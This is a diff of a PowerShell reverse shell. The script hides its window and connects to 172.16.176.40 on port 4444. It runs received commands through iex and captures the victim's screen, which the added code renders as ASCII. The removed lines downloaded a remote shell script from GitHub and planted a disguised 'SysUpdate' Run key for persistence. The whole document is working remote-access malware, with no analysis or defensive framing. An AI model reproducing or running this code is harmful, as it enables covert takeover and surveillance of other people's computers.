@@ -1,28 +1,14 @@
-$m = Add-Type -Name Win32 -MemberDefinition @'
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'@ -PassThru
+$m = Add-Type -Name Win32 -MemberDefinition @'[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'@ -PassThru
 $m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-# 2. Setup Aliases for convenience (Linux-style commands)
+# 2. Aliases
 if (-not (Get-Command touch -ErrorAction SilentlyContinue)) { New-Alias -Name touch -Value New-Item -Force }
 
-# 3. Persistence - HKCU Run Key
-$gh = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1'
-$tmp = "$env:TEMP\sysupd.ps1"
-if (-not (Test-Path $tmp)) { try { iwr $gh -OutFile $tmp -UseBasicParsing } catch {} }
-$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
-if (-not (Get-ItemProperty $reg -Name "SysUpdate" -ErrorAction SilentlyContinue)) { 
-    Set-ItemProperty $reg -Name "SysUpdate" -Value "powershell.exe -WindowStyle Hidden -File $tmp" 
-}
-
-# 4. Main Connection Loop
 while($true) {
     try {
         $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
-        $s = $c.GetStream()
-        $e = New-Object System.Text.UTF8Encoding
-        
-        $p = $e.GetBytes("`n[+] Connection Established. Commands: screenshot, kill, touch`nPS $PWD> ")
+        $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
+        $p = $e.GetBytes("`n[+] Visual Shell Active. Commands: 'screenshot', 'kill'`nPS $PWD> ")
         $s.Write($p, 0, $p.Length)
 
         [byte[]]$b = New-Object byte[] 65535
@@ -30,39 +16,56 @@ while($true) {
             $input = $e.GetString($b, 0, $i).Trim()
             $out = ""
 
-            if ($input -eq 'kill') {
-                # Cleanup and Exit
-                Remove-ItemProperty -Path $reg -Name "SysUpdate" -Force -ErrorAction SilentlyContinue
-                Stop-Process -Id $PID -Force
-            } 
+            if ($input -eq 'kill') { Stop-Process -Id $PID -Force } 
+            
             elseif ($input -eq 'screenshot') {
                 try {
-                    # Capture Screen
                     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-                    $bmp = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
-                    $g = [System.Drawing.Graphics]::FromImage($bmp)
-                    $g.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $bmp.Size)
                     
-                    # Convert to Base64 String
-                    $ms = New-Object System.IO.MemoryStream
-                    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
-                    $base64 = [Convert]::ToBase64String($ms.ToArray())
+                    # Get actual screen bounds
+                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $width = $screen.Width
+                    $height = $screen.Height
                     
-                    $out = "`n---BEGIN SCREENSHOT---`n$base64`n---END SCREENSHOT---`n"
+                    # 1. Capture full screen first
+                    $mainBmp = New-Object System.Drawing.Bitmap $width, $height
+                    $g = [System.Drawing.Graphics]::FromImage($mainBmp)
+                    $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $mainBmp.Size)
                     
-                    $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
+                    # 2. Scale down for ASCII (Width 100 is standard terminal)
+                    $asciiW = 100
+                    $asciiH = [int]($asciiW * ($height / $width) * 0.5)
+                    $smallBmp = New-Object System.Drawing.Bitmap $asciiW, $asciiH
+                    $g2 = [System.Drawing.Graphics]::FromImage($smallBmp)
+                    $g2.DrawImage($mainBmp, 0, 0, $asciiW, $asciiH)
+                    
+                    # 3. Build ASCII String
+                    $ascii = "`n--- REMOTE VIEW ($width x $height) ---`n"
+                    # Char map from darkest to lightest
+                    $ramp = "#","W","M","B","@","q","o","*","+","-",":","."," "
+                    
+                    for ($y=0; $y -lt $asciiH; $y++) {
+                        for ($x=0; $x -lt $asciiW; $x++) {
+                            $pColor = $smallBmp.GetPixel($x, $y)
+                            $brightness = ($pColor.R + $pColor.G + $pColor.B) / 3
+                            # Map 0-255 brightness to 0-12 index
+                            $index = [int][Math]::Floor(($brightness / 255) * ($ramp.Length - 1))
+                            $ascii += $ramp[$index]
+                        }
+                        $ascii += "`n"
+                    }
+                    $out = $ascii + "--- END VIEW ---`n"
+                    
+                    # Cleanup memory
+                    $g.Dispose(); $g2.Dispose(); $mainBmp.Dispose(); $smallBmp.Dispose()
                 } catch { $out = "[!] Screenshot Error: $($_.Exception.Message)`n" }
             }
             else {
-                # Normal Command Execution
                 $out = try { if ($input) { iex $input 2>&1 | Out-String } } catch { $_.Exception.Message }
             }
 
-            # Send Output back to C2
             $resp = $e.GetBytes($out + "PS $PWD> ")
-            $s.Write($resp, 0, $resp.Length)
-            $s.Flush()
+            $s.Write($resp, 0, $resp.Length); $s.Flush()
         }
     } catch { Start-Sleep 5 }
 }
